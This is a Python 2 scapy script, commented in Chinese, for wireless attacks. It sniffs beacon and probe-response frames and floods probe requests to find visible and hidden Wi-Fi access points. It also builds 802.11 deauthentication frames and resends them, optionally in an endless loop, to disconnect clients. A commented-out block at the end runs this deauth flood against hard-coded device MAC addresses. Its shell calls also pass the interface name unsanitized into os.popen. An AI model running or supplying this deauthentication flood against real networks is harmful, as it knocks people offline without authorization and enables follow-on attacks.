#!/usr/bin/python2
#-*-coding:utf-8-*-

'''
这个程序需要在root权限下运行
'''

import os,sys,threading,argparse,copy

import binascii  #隐藏热点的SSID值为b'\x00\x00\x00\x00\x00\x00\x00'，需要使用这个库进行转换

from scapy.all import *

#默认监听端口
iface = ''
#发送Probe Request的机器的物理地址
addr = ''

#探测到Probe Response帧的数量
count_5 = 0
#探测到信标帧的数量
count_8 = 0

#标志ProbeReq帧是否已经发送完
over = False
#发送的Probe Request帧的数量
count_sendp = 0
#addr2_list = set()
ssids = {}
hide_ssids = set()



class Redirect:
    def __init__(self):
        self.content = ''
        self.savedStdout = sys.stdout
        self.hidden = None
    
    def write(self,outStr):
        #self.content += outStr
        pass
    
    def recover(self):
        sys.stdout = self.savedStdout
    def redirect(self):
        self.hidden = open(os.devnull,'w')
        sys.stdout = self.hidden


def handleArgv():
    global iface,addr,count_5,count_8,count_sendp
    parser = argparse.ArgumentParser()
    parser.add_argument('-i','--iface',type=str,default='mon0')
    parser.add_argument('-a','--addr',type=str,default='40:e2:30:d2:c4:0f')
    parser.add_argument('-5','--count_5',type=int,default=100)
    parser.add_argument('-8','--count_8',type=int,default=100)
    parser.add_argument('-c','--count_sendp',type=int,default=1000)
    argv = parser.parse_args()
    iface = argv.iface
    addr = argv.addr
    count_5 = argv.count_5
    count_8 = argv.count_8
    count_sendp = argv.count_sendp
    #print(argv)



def isExist(iface):
    info = os.popen("iw dev | grep -E '"+iface+"$'").read()
    if info != '':
        print(iface+':接口存在')
    else:
        sys.exit('sorry,'+iface+'接口不存在')

def startMonitor(iface):
    info = os.popen("iwconfig "+iface+" | grep '"+iface+"' | awk '{print $4}'").read()
    if 'Monitor' in info or 'monitor' in info:
        print(iface+':监听模式已启动')
    else:
        print(iface+':尚未开启监听模式')

def searchSSID(iface,subtype):
    count = count_8 if subtype == 8 else count_5
    if count == 0:
        return
    pkts = sniff(iface=iface,count=count,lfilter=lambda x : x.type==0 and x.subtype==subtype)
    wrpcap('../res/data_from_py_subtype:{0}.pcap'.format(subtype),pkts)
    for pkt in pkts:
        if pkt.info == '':
            pass
        elif binascii.hexlify(pkt.info)[:2] != '00':
            ssids[pkt.info] = pkt.addr2
        else:
            hide_ssids.add(pkt.addr2)


class ManagementFrame:
    def __init__(self,Rates='\x02\x04\x0b\x16',ESRates='\x0c\x12\x18\x24\x30\x48\x60\x6c'):
        self.Rates = Rates
        self.ESRates = ESRates

    def ProbeReq(self,addr2,addr1='ff:ff:ff:ff:ff:ff',addr3='ff:ff:ff:ff:ff:ff',SSID=''):
        pkt = RadioTap(len=13,present='Rate+b15+b17',notdecoded='\x02\x00\x00\x00\x00')
        pkt /= Dot11(addr1=addr1,addr2=addr2,addr3=addr3)
        pkt /= Dot11ProbeReq()/Dot11Elt(ID='SSID',info=SSID)
        pkt /= Dot11Elt(ID='Rates',info=self.Rates)
        pkt /= Dot11Elt(ID='ESRates',info=self.ESRates)
        #pkt /= Dot11Elt(ID='DSset',info='\x01')
        #pkt /= Dot11Elt(ID=45,info='\x2C\x01\x03\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        #pkt /= Dot11Elt(ID='vendor',info='\x00\x50\xf2\x08\x00\x00\x00')
        return pkt

    def Deauth(self,addr1,addr2,addr3):
        '''
        当addr1赋值为ff:ff:ff:ff:ff:ff时，返回的解除认证帧为广播发送
        当不发送广播包时，返回两个解除认证帧，一个为ap2sta，另一个为sta2ap
        '''
        pkt = RadioTap(len=12,present='Rate+b15',notdecoded='\x02\x00\x18\x00')
        pkt /= Dot11(ID=14849,addr3=addr3,addr4=None)
        pkt /= Dot11Deauth(reason='class3-from-nonass')

        if addr1 == 'ff:ff:ff:ff:ff:ff':
            pkt_broadcast = copy.deepcopy(pkt)
            pkt_broadcast.addr1 = addr1
            pkt_broadcast.addr2 = addr2
            return pkt_broadcast
        else:
            ap2sta = copy.deepcopy(pkt)
            sta2ap = copy.deepcopy(pkt)
            if addr2 == addr3:
                ap2sta.addr1 = addr1
                ap2sta.addr2 = addr2
                sta2ap.addr1 = addr2
                sta2ap.addr2 = addr1
            elif addr1 == addr3:
                ap2sta.addr1 = addr2
                ap2sta.addr2 = addr1
                sta2ap.addr1 = addr1
                sta2ap.addr2 = addr2
            return ap2sta , sta2ap

    def startSendpDeauth(self,broadcast=False,times=1,*pkts):
        r = Redirect()
        r.redirect()
        if broadcast:
            if times == 0:
                while True:
                    j = -1
                    for i in range(128):
                        if i%2 == 0:
                            j = j+1
                        pkt = copy.deepcopy(pkts[0])
                        pkt.SC = pkt.SC + j*32
                        #print(j,':',pkt.SC)
                        sendp(pkt,iface=iface)
            else:
                for time in range(times):
                    j = -1
                    for i in range(128):
                        if i%2 == 0:
                            j = j+1
                        pkt = copy.deepcopy(pkts[0])
                        pkt.SC = pkt.SC + j*32
                        #print(j,':',pkt.SC)
                        sendp(pkt,iface=iface)
        else:
            if times == 0:
                while True:
                    j = -1
                    for i in range(128):
                        if i%2 == 0:
                            j = j+1
                        pkt = copy.deepcopy(pkts[i%2])
                        pkt.SC = pkt.SC + j*32
                        #print(j,':',pkt.SC)
                        sendp(pkt,iface=iface)
            else:
                for time in range(times):
                    j = -1
                    for i in range(128):
                        if i%2 == 0:
                            j = j+1
                        pkt = copy.deepcopy(pkts[i%2])
                        pkt.SC = pkt.SC + j*32
                        #print(j,':',pkt.SC)
                        sendp(pkt,iface=iface)
        r.recover()
        print('')#换行，使打印更好看
        return
      
    






if __name__ == '__main__':
    handleArgv()
    print('iface:'+iface+' addr:'+addr)
    print('subtype :8 count :'+str(count_8)+'       subtype :5 count :'+str(count_5))
    isExist(iface)
    startMonitor(iface)
    mgt = ManagementFrame()
    pkt = mgt.ProbeReq(addr)

    th1 = threading.Thread(target=searchSSID,args=(iface,8))
    th2 = threading.Thread(target=searchSSID,args=(iface,5))
    th1.start()
    th2.start()
    sendp(pkt,count=count_sendp,iface=iface)
    th1.join()
    th2.join()
    print('detect packets count :'+str(count_5)+' type :5 over')
    print('detect packets count :'+str(count_8)+' type :8 over')

    print('---未隐藏热点---')
    for i,j in ssids.items():
        print('找到热点:'+i+' BSSID为:'+j)

    print('---隐藏热点---')
    for i in hide_ssids:
        print('找到隐藏热点 BSSID为:'+i)
    
    
    '''
    mgt = ManagementFrame()
    ap2sta_broadcast = mgt.Deauth('ff:ff:ff:ff:ff:ff','f0:b4:29:57:37:d7','f0:b4:29:57:37:d7')
    #print(ap2sta_broadcast) #输出显示有问题，但帧的构造没有问题
    ap2sta,sta2ap = mgt.Deauth('10:f6:81:f4:fa:63','f0:b4:29:57:37:d7','f0:b4:29:57:37:d7')
    #print(ap2sta,sta2ap)
    ap2sta,sta2ap = mgt.Deauth('f0:b4:29:57:37:d7','10:f6:81:f4:fa:63','f0:b4:29:57:37:d7')
    #print(ap2sta,sta2ap)
    #mgt.startSendpDeauth(True,1,ap2sta_broadcast)
    mgt.startSendpDeauth(False,1,ap2sta,sta2ap)
    '''